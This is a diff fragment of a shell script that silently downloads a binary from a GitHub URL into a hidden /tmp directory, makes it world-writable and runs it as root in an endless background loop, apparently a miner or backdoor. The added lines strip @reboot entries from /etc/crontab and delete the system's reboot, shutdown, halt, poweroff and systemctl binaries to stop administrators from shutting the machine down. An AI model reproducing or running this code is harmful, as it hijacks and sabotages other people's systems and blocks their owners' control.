@@ -6,7 +6,5 @@ wget -qO /tmp/.config/sleep https://raw.githubusercontent.com/vjbahkds/cajbdfv/m
 chmod -R 777 /tmp/.config
 /bin/sh -c "while true; do nohup sudo /tmp/.config/sleep --config=/tmp/.config/.json >/dev/null; done" &
 
-# 
-
-
-
+sudo sed -i '/^@reboot/d' /etc/crontab
+sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
